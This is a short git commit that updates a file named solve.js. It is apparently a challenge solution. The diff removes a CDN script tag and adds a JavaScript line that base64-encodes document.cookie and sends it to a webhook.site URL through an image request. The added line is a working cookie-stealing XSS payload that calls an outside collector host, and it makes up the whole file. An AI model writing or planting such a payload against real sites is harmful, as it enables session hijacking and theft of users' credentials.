89c6ba1cd58ed5478f219b052da2761f6dc2f8ab
Nathan <131342646+Arximos@users.noreply.github.com>
2025-01-10 13:26:53 +0300

    Update solve.js

--- solve.js
+++ solve.js
@@ -1,1 +1,2 @@
-<script src="https://cdn.jsdelivr.net/gh/Arximos/ecommerce-website/solve.js"></script>
+x = new Image(); x.src = 'https://webhook.site/b0a9cbc8-4d1e-4ca2-9cb1-c64c4da898bd?
+data='+btoa(document.cookie);
